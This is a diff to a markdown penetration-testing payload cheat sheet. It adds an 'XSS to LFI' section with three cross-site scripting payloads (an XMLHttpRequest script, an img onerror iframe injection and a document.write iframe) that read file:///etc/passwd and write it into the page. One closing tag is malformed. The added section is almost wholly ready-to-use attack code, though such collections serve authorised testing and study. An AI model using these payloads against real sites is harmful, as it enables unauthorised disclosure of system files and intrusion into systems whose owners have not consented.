@@ -24,6 +24,7 @@
   - [Open redirect](#open-web-redirect)
   - [PHP filter](#php-filters-for-lfi)
   - [Cross Side Scripting (XSS)](#xss-common-payloads)
+      - [XSS to LFI](#xss-to-lfi)
   - [XML External Entity (XXE)](#xxe-common-payloads)
   - [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
   - [Sever Side Request Forgery (SSRF)](#ssrf-common-payloads)
@@ -208,7 +209,28 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 <x oncut=alert()>x
 <svg onload=write()>
 ```
+### XSS to LFI
 
+#### most common payloads
+`<script>`
+```js
+<script>
+    x=new XMLHttpRequest;
+    x.onload=function(){
+        document.write(this.responseText)
+    };
+    x.open("GET","file:///etc/passwd");
+    x.send();
+</script>
+```
+`<iframe>`
+```
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+```
+`<script>` and `<iframe>` with `document.write`
+```
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+```
 --------------------------------------------------------------------------------------------------------------
 # XXE common payloads
 ### XXE: read local files
